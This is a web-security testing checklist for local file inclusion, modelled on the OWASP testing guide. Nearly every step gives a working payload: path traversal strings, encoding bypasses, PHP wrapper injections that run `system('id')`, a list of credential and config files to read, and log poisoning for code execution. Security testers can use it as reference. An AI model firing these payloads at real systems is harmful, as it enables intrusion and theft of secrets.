# OWASP WSTG-INPV-11: File Inclusion Testing

Reference: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection

## Step 1 — Identify file-like parameters

Parameters named: page, file, include, path, doc, template,
view, content, folder, style, lang.

## Step 2 — Test path traversal

- `../../../etc/passwd` (Linux)
- `..\..\..\windows\win.ini` (Windows)

## Step 3 — If basic traversal blocked, try bypasses

- Double encoding: `..%252f..%252f..%252fetc/passwd`
- Null byte (old PHP): `../../../etc/passwd%00`
- Double dots: `....//....//....//etc/passwd`
- URL encoding: `%2e%2e%2f%2e%2e%2fetc/passwd`

## Step 4 — PHP-specific (if PHP detected)

- `php://filter/convert.base64-encode/resource=index`
  → returns source code as base64 (bypasses most filters)
- `php://input` with POST body: `<?php system('id'); ?>`
- `data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+`

## Step 5 — Read valuable files if LFI works

- `/etc/passwd`, `/etc/shadow` (if readable)
- Application config: `config.php`, `.env`, `database.yml`, `wp-config.php`
- `/proc/self/environ` (may contain secrets)

## Step 6 — Escalate to RCE via log poisoning

Inject PHP code into access log via User-Agent header.
Then include the log file: `?page=../../../var/log/apache2/access.log`
